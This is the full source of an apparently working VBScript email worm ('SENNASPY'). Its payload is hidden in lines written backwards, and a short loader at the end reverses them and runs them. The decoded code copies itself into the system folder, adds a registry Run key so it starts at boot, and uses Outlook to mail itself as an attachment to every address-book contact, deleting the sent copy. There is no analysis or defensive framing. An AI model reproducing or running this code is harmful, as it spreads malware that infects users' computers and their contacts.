'txeN emuseR rorrE nO
') "tcejbOmetsySeliF.gnitpircS" (tcejbOetaerC = 10A teS
') "SBV.YPSANNES" ,)1(redloFlaicepSteG.10A (htaPdliuB.10A ,emaNlluFtpircS.tpircSW eliFypoC.10A
') "llehS.tpircSW" (tcejbOetaerC = 20A teS
') "SBV.YPSANNES" ,)1(redloFlaicepSteG.10A (htaPdliuB.10A ,"YPSANNES" & "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" etirWgeR.20A
') "YPSANNES" & "\ENIHCAM_LACOL_YEKH" (daeRgeR.20A = 40A
'nehT 02 > 40A rO "" = 40A fI
'0 = 40A 
'fI dnE
'nehT 0 = 40A fI
') "noitacilppA.kooltuO" (tcejbOetaerC = 50A teS 
') "IPAM" (ecapSemaNteG.50A = 60A teS 
'stsiLsserddA.60A nI 70A hcaE roF 
') 0 (metIetaerC.50A = 80A teS 
'tnuoC.seirtnEsserddA.70A oT 1 = 90A roF 
') 90A (seirtnEsserddA.70A = 01A teS 
'nehT 1 = 90A fI 
'sserddA.01A = CCB.80A 
'eslE 
'sserddA.01A & " ;" & CCB.80A = CCB.80A 
'fI dnE 
'txeN 
'"tcejbuS" = tcejbuS.80A 
'"ydoB" = ydoB.80A 
'emaNlluFtpircS.tpircSW ddA.stemhcattA.80A 
'eurT = timbuSretfAeteleD.80A 
'dneS.80A 
'txeN 
'0 = 40A 
'fI dnE
'1 + 40A ,"YPSANNES" & "\ENIHCAM_LACOL_YEKH" etirWgeR.20A
'THE BLUE BUS IS CALLING US...
'On error resume next
set fso=createobject("scripting.filesystemobject")
set r=fso.opentextfile(wscript.scriptfullname)
a=0
do
buffer=r.readline
buffer2=strreverse(buffer)
buffer3=mid(buffer2,1,len(buffer2)-1)
all=all & ":" & buffer3
a=a+1
loop while a<>31
Georgia=mid(all,2,len(all)-1)
execute(Georgia)

